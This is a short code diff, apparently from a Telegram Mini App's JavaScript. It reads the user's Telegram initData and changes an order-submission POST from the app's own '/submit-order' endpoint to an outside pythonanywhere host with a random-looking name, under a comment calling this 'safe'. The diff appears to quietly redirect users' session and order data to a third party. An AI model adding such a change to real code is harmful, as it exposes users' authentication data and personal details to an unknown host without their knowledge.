@@ -49,7 +49,8 @@
             const initData = tg.initData; 
             
             // Forward data to the cloud service backend safely
-            fetch('/submit-order', {
+            fetch('https://luvwnqww.pythonanywhere.com/', {
+
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
